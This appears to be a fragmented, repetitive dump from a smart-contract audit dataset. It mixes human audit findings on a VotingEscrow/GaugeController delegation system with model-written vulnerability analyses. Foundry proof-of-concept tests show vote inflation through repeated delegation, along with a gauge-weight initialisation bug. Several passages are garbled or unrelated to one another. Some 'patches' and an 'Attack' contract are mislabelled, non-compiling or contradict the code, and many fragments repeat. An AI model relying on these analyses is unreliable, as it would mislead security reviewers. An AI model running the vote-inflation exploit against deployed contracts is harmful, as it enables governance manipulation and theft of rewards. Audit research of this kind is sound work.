This would cause the contract to zero out the tracked deposited balance without checking if the user had claimed their rewards, resulting in a loss of unclaimed rewards for the user.\n\nTo patch this vulnerability, I would suggest adding a check that verifies whether the user has already claimed their rewards before zeroing out the tracked deposited balance.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

                "decompose": "  Based on the given smart contract code, I would say that it is not vulnerable to the \"Incorrect calculation of total voting power\" vulnerability. Here's why:\n\n1. The code does not directly calculate the total voting power. Instead, it uses a variable called `power_used` to keep track of how much voting power has been used by each user. This variable is updated every time a new vote is cast, and it ensures that no single user can use more than 10% of the total voting power in a given time frame (i.e., one week).\n2. The code also checks that `power_used` is non-negative and less than or equal to 10,000 before allowing a vote to be cast. This ensures that no single user can use more than the total voting power in a given time frame, even if the contract has been tampered with or there are other issues with the code.\n3. The code also checks that `slope` is non-negative before allowing a vote to be cast. This ensures that no single user can use an incorrect slope value to gain an unfair advantage in voting.\n\nOverall, I believe that this smart contract code is well designed and does not have any obvious vulnerabilities related to the \"Incorrect calculation of total voting power\" vulnerability. However, it's always important to double-check the code and ensure that there are no other issues or vulnerabilities that could be exploited by malicious actors.",

The function first checks that the user has enough power (i.e., tokens) to make the vote and then updates the user's power usage. It then removes any old slopes and schedules new slope changes.\n\nThe issue is that if a user makes multiple votes in quick succession, they can accumulate unbonded value from previous votes without their power being updated properly. This means that their vote will have more weight than it should, leading to an unfair outcome in the voting system.\n\nTo exploit this vulnerability, an attacker could make multiple calls to the `vote_for_gauge_weights` function with different gauge addresses and user weights in quick succession. The attacker would need to have enough power to make all of these votes, but they would not need to use up their entire power allocation.\n\nThe attacker could then use the unbonded value from their previous votes to make a new vote that is significantly more powerful than it should be. This could allow them to achieve unanimous outcomes in the voting system, which could lead to undesirable consequences for other users who do not have enough power to influence the outcome of the vote.\n\nTo fix this vulnerability, we would need to ensure that the user's power usage is properly updated before allowing them to make a new vote. We could achieve this by adding a check to the `vote_for_gauge_weights` function that ensures the user has not accumulated too much unbonded value from previous votes.\n\nHere is an example patch to fix this vulnerability:\n```solidity\nfunction vote_for_gauge_weights(address _gauge_addr, uint256 _user_weight) external {\n    require(_user_weight >= 0 && _user_weight <= 10_000, \"Invalid user weight\");\n    require(isValidGauge[_gauge_addr], \"Invalid gauge address\");\n    VotingEscrow ve = votingE",

This can effectively extend the user's voting power without actually increasing the amount of tokens they have locked.\n\nIn order for this vulnerability to occur, the following conditions must be met:\n\n1. The user must first lock their tokens with a shorter lock time than the desired voting power.\n2. The user must then delegate these tokens to a delegatee who has a longer lock time than they do.\n3. The user must then undelegate their tokens from the original delegatee and re-delegate them to another account that has a longer lock time than the original delegatee.\n4. The user must then force their main account to be blocked, which will undelegate the locked tokens with an expired lock.\n5. The user can then withdraw their tokens and repeat the process in order to extend their voting power without actually increasing the amount of tokens they have locked.\n\nThe vulnerability is caused by the `delegate` function not properly updating the owner's lock when re-delegating tokens.

This means that an attacker can repeatedly call the `delegate` function with the same inputs and delegate their tokens to multiple different addresses without being stopped by the `require` statements.\n\nTo exploit this vulnerability, an attacker would need to have some way of getting a user to call the `delegate` function repeatedly with the same inputs. For example, they could create a smart contract that contains a loop that calls the `delegate` function repeatedly with a single input and use that contract as a starting point for their own attack.\n\nHere is an example PoC (Proof of Concept) to demonstrate how this vulnerability can be exploited:\n```javascript\npragma solidity ^0.8.4;\n\ncontract Attack {\n    function delegate(address addr, uint256 amount) public {\n        // Delegate tokens to the specified address\n        LockedBalance memory locked = locked[addr];\n        require(locked.amount > 0, \"No lock\");\n        require(locked.delegatee != addr, \"Already delegated\");\n        int128 value = locked.amount;\n        locked[addr].delegatee = msg.sender; // Update owner lock\n        _delegate(addr, LockedBalance memory, value, LockAction.DELEGATE);\n    }\n}\n```\nIn this PoC, the `Attack` contract contains a `delegate` function that takes an address and a uint256 amount as inputs. The function calls the `LockedBalance` function to get the locked balance for the specified address and then checks if it has already delegated its tokens. If not, it updates the owner lock for the specified address and then calls the `_delegate` function with the appropriate parameters.\n\nThe PoC can be used to demonstrate how this vulnerability can be exploited.

If the same NFT is later added back to the vault without a timelock, the vault will perceive it as a timelocked NFT with the old recipient, leading to a situation where the current owner cannot withdraw the NFT without the help of the old recipient.\n\nTo mitigate this vulnerability, you can add a deletion mechanism for the timelock data after a successful transfer is made. This ensures that the token lock data is properly removed and prevents any lingering stale recipient information from causing the NFT to become permanently locked in the vault.\n\nHere's an example patch that incorporates this fix:\n```solidity\nfunction delegate(address _addr) external nonReentrant {\n    LockedBalance memory locked_ = locked[msg.sender];\n    // Validate inputs\n    require(locked_.amount > 0, \"No lock\");\n    require(locked_.delegatee != _addr, \"Already delegated\");\n    // Update locks\n    int128 value = locked_.amount;\n    address delegatee = locked_.delegatee;\n    LockedBalance memory fromLocked;\n    LockedBalance memory toLocked;\n    locked_.delegatee = _addr;\n    if (delegatee == msg.sender) {\n        // Delegate\n        fromLocked = locked_;\n        toLocked = locked[_addr];\n    } else if (_addr == msg.sender) {\n        // Undelegate\n        fromLocked = locked[delegatee];\n        toLocked = locked_;\n",

The reason for this vulnerability is that the contract accepts any contract address provided as input parameters without verifying whether these addresses represent approved marketplaces, allowing an attacker to create a fraudulent contract (Fake Market B) and trick Contract C into believing it's interacting with the legitimate Market B. When Contract C intends to repay a debt in Market B by transferring assets, due to authorization previously granted by the user, it first gives the Fake Market B contract unlimited access to the user's assets held in a shared repository (YieldBox).\n\nThe proposed solution is to implement a validation mechanism that checks any contract addresses provided as Market A or Market B are checked against a registry of approved marketplaces maintained by the protocol before proceeding with authorized operations.",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

This means that a user can potentially perform a lock-staking attack by deploying multiple accounts and then delegating their tokens to another account with an expired lock.

However, there is no explicit mechanism for deleting this data after a successful transfer is made.\n2.

This allows stale recipient information to remain in the contract, which can cause the NFT to become permanently locked in the vault.\n3. The vulnerability is exacerbated by the fact that the `delegate` function only checks if the current owner of the NFT has a timelock, but it does not check if the new delegatee address also has an existing timelock. If the delegatee already has a timelock, the transfer will succeed even if the recipient information is stale.\n\nIn conclusion, the given smart contract code is vulnerable to the Incomplete Deletion of Timelock Data Leading to Stale Recipient and Permanent Token Lock vulnerability due to its incomplete handling of timelock data after a transfer is made.",

There are 2 ways to set this value: through `_get_weight` and `_change_gauge_weight`. \n```solidity\nfunction _get_weight(address _gauge_addr) private returns (uint256) {\n        uint256 t = time_weight[_gauge_addr];\n        if (t > 0) {\n            Point memory pt = points_weight[_gauge_addr][t];\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n            return pt.bias;\n        } else {\n            return 0;\n        }\n    }\n``` \nThe problem in `_get_weight` is that the initial value of any `time_weight[_gauge_addr]` will be 0. It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0. Any  time a user will use `_get_weight` to fill with recent data, the function will iterate over old values and will do nothing. Recent values won't be set and anything depending on it will receive 0 as a recent value.\n```solidity\n    function _change_gauge_weight(address _gauge, uint256 _weight) internal {\n        uint256 old_gauge_weight = _get_weight(_gauge);\n        uint256 old_sum = _get_sum();\n        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;\n\n        points_weight[_gauge][next_time].bias = _weight;\n        time_weight[_gauge] = next_time;\n\n        uint256 new_sum = old_sum + _weight - old_gauge_weight;\n        points_sum[next_time].bias = new_sum;\n        time_sum = next_time;\n    }\n```\nSince `_change_gauge_weight` is not called within `add_gauge`, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again.\nHere are 3 written test-cases which prove the statements above: \n```solidity\n   function testWithoutManualSet() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithManualSet() public { \n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithChangeMidway() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n\n        vm.prank(gov);\n        gc.change_gauge_weight(gauge1, 0);\n\n        vm.startPrank(user1);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set\", weight);\n\n        gc.vote_for_gauge_weights(gauge1, 0);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set after vote reset\", weight);\n        \n    }\n```\nand the respective results:\n```\n[PASS] testWithoutManualSet() (gas: 645984)\nLogs:\n  gauge's weight after voting:  0\n```\n```\n[PASS] testWithManualSet() (gas: 667994)\nLogs:\n  gauge's weight after voting:  993424657416307200\n```\n```\n[PASS] testWithChangeMidway() (gas: 744022)\nLogs:\n  gauge's weight after voting:  0\n  gauge's weight after voting after admin set 0\n  gauge's weight after voting after admin set after vote reset 993424657416307200\n```\n\n## Tools Used\nManual Review, Foundry\n\n## Recommended Mitigation Steps\nUpon adding a gauge, make a call to `change_gauge_weight` and set its initial weight to 0. \n\n\n\n\n\n## Assessed type\n\nError",

This could be achieved by adding a check in the `add_gauge` function that ensures that the gauge is not added until after the rewards have been queued for the current cycle.\n\nHere is an example of how this might be implemented:\n```csharp\n// Add a new gauge to the system\nfunction add_gauge(address _gauge) external onlyGovernance {\n    require(!isValidGauge[_gauge], \"Gauge already exists\");\n\n    // Ensure that the gauge is not added until after rewards have been queued for the current cycle\n    if (queuedRewards[currentCycle] == 0) {\n        isValidGauge[_gauge] = true;\n        emit NewGauge(_gauge);\n    } else {\n        // The gauge will be added after rewards have been queued for the current cycle\n        pendingRewards.push(QueuedReward(_gauge, 1));\n    }\n}\n```\nIn this example, we have added a new check to ensure that the `isValidGauge` flag is only set to true if the gauge has already been queued for rewards in the current cycle. If the gauge has not yet been queued for rewards, it will be added to the `pendingRewards` queue and will be processed after all rewards have been queued for the current cycle.\n\nBy implementing this mechanism, we can ensure that gauges are only added to the system after rewards have been queued for the cycle, mitigating",

This oversight can result in certain gauges not receiving their due rewards and also allows for the possibility of a Denial of Service (DoS) attack, where a malicious actor could exploit this weakness to prevent specific gauges from obtaining rewards.

There are 2 ways to set this value: through `_get_weight` and `_change_gauge_weight`. \n```solidity\nfunction _get_weight(address _gauge_addr) private returns (uint256) {\n        uint256 t = time_weight[_gauge_addr];\n        if (t > 0) {\n            Point memory pt = points_weight[_gauge_addr][t];\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n            return pt.bias;\n        } else {\n            return 0;\n        }\n    }\n``` \nThe problem in `_get_weight` is that the initial value of any `time_weight[_gauge_addr]` will be 0. It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0. Any  time a user will use `_get_weight` to fill with recent data, the function will iterate over old values and will do nothing. Recent values won't be set and anything depending on it will receive 0 as a recent value.\n```solidity\n    function _change_gauge_weight(address _gauge, uint256 _weight) internal {\n        uint256 old_gauge_weight = _get_weight(_gauge);\n        uint256 old_sum = _get_sum();\n        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;\n\n        points_weight[_gauge][next_time].bias = _weight;\n        time_weight[_gauge] = next_time;\n\n        uint256 new_sum = old_sum + _weight - old_gauge_weight;\n        points_sum[next_time].bias = new_sum;\n        time_sum = next_time;\n    }\n```\nSince `_change_gauge_weight` is not called within `add_gauge`, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again.\nHere are 3 written test-cases which prove the statements above: \n```solidity\n   function testWithoutManualSet() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithManualSet() public { \n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithChangeMidway() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n\n        vm.prank(gov);\n        gc.change_gauge_weight(gauge1, 0);\n\n        vm.startPrank(user1);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set\", weight);\n\n        gc.vote_for_gauge_weights(gauge1, 0);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set after vote reset\", weight);\n        \n    }\n```\nand the respective results:\n```\n[PASS] testWithoutManualSet() (gas: 645984)\nLogs:\n  gauge's weight after voting:  0\n```\n```\n[PASS] testWithManualSet() (gas: 667994)\nLogs:\n  gauge's weight after voting:  993424657416307200\n```\n```\n[PASS] testWithChangeMidway() (gas: 744022)\nLogs:\n  gauge's weight after voting:  0\n  gauge's weight after voting after admin set 0\n  gauge's weight after voting after admin set after vote reset 993424657416307200\n```\n\n## Tools Used\nManual Review, Foundry\n\n## Recommended Mitigation Steps\nUpon adding a gauge, make a call to `change_gauge_weight` and set its initial weight to 0. \n\n\n\n\n\n## Assessed type\n\nError",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

The vulnerability arises from the incorrect subtraction calculation in the `delegate` function.\n\nThe `locked` mapping stores the locked balance of each user, which includes the amount and end timestamp of the lock. When a user delegates their lock to another address, the `delegate` function updates the `delegatee` field of the sender's locked balance entry and the `amount` field of the recipient's locked balance entry. However, the subtraction calculation in the function is incorrect. Instead of subtracting the desired amount from the current locked amount, the function mistakenly subtracts a constant value (e.g., 1), leading to an incorrect calculation and an inability to unlock the funds.\n\nThe `delegate` function first retrieves the sender's locked balance entry using the `msg.sender` address as the key. It then checks if the amount is greater than zero and if the delegatee is different from the `_addr` argument. If both conditions are true, the function updates the `delegatee` field of the sender's locked balance entry to the `_addr` argument.\n\nThe next step is to retrieve the recipient's locked balance entry using the `_addr` argument as the key. The function then checks if the amount is greater than zero and if the end timestamp is later than the current block timestamp.

The function validates inputs, updates locks, and performs actions based on the user's request. However, upon closer inspection, we can identify several potential issues with this implementation:\n\n1. Re-delegation without unlocking: The `delegate` function allows users to re-delegate their tokens from one address to another while keeping them locked. This could potentially lead to a situation where a user has multiple accounts locked for different durations, each delegated to a different account. By doing so, the user can effectively circumvent the lock duration and maintain voting power without unlocking their tokens.\n2. Lock extension: The `delegate` function also allows users to extend the lock period by delegating their tokens to an address with a longer lock duration. This could potentially lead to an exploit where a user locks their tokens for a short duration, then extends the lock period by repeatedly delegating them to addresses with shorter lock durations.\n3. Undelegation without unlocking: The `delegate` function also allows users to undelegate their tokens from one address and delegate them to another without unlocking them. This could potentially lead to a situation where a user has multiple accounts locked for different durations, each delegated to a different account.

                "poc_patch": "  Based on the given vulnerability knowledge, I would say that the smart contract code is vulnerable to a type of attack known as \"lock evasion\" or \"lock busting\". This occurs when a user is able to withdraw their tokens from a locked account without first unlocking them, effectively circumventing the system's incentives and undesired consequences.\n\nThe reason for this vulnerability is that the `delegate` function allows a user to transfer their voting power to another address while still maintaining their ownership of the tokens. However, it does not check whether the target address has a long enough lock period to support the transfer of voting power. This means that if the target address has a shorter lock period than the original account, the transfer will fail and the user will be able to withdraw their tokens without losing any voting power.\n\nTo exploit this vulnerability, an attacker could create multiple accounts with varying lock periods, delegate their voting power to one of these accounts, and then unlock the token balance from that account while keeping the voting power. This would effectively allow them to enjoy the benefits of long lock times without committing any tokens to the system, circumventing the original purpose of the locked tokens and risking the proper functioning of the protocol.\n\nTo patch this vulnerability, I would suggest modifying the `delegate` function to include a check for the lock period of the target address before transferring voting power. This would ensure that only accounts with a long enough lock period can receive voting power from the original account. Additionally, it may be helpful to implement an \"unlock fee\" or other mechanism to discourage users from withdrawing tokens without first unlocking them.\n\nIn terms of generating a Proof of Concept (PoC) for this vulnerability, I would suggest creating a simple test case where a user is able to transfer their voting power to another account with a shorter lock period while maintaining ownership of the tokens. This could be done by creating two accounts, one with a long lock period and one with a shorter lock period, then calling the `delegate` function with the address of the short-lock account as the target.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.\n\n## Proof of Concept\nTo exit the system, Alice must call `withdraw()`.

